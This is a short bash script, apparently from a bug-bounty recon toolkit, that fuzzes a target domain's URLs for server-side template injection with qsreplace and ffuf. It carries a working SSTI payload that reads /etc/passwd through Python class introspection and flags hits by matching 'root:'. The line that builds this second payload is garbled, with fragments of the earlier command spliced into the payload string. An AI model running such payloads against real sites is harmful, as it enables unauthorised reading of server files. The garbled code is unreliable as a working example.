#!/bin/bash

domain=$1
tools=~/tools
HEADER="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"

if [[ ! -d "ssti" ]]; then
	mkdir ssti;
fi

if [[ -f "gf/${domain}_ssti.txt" ]]; then
	cat gf/${domain}_ssti.txt | qsreplace "ssti{{7*7}}" | anew -q ssti/.ssti_fuzz.txt
	ffuf -v -mc 200 -H "${HEADER}" -w ssti/.ssti_fuzz.txt -u FUZZ -mr "ssti49" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ssti/${domain}_ssti.txt
	cat gf/${domain}_ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etcqsreplace 'ssti{{7*7}}' | anew -q ssti/.ssti_fuzz.txt/passwd').read()}}cat gf/${domain}_ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etcqsreplace "ssti{{7*7}}" | anew -q ssti/.ssti_fuzz.txt/passwd').read()}}" | anew -q .tmp/ssti_fuzz2.txt" | anew -q .tmp/ssti_fuzz2.txt
	ffuf -v -mc 200 -H "${HEADER}" -w ssti/.ssti_fuzz.txt -u FUZZ -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ssti/${domain}_ssti.txt
fi
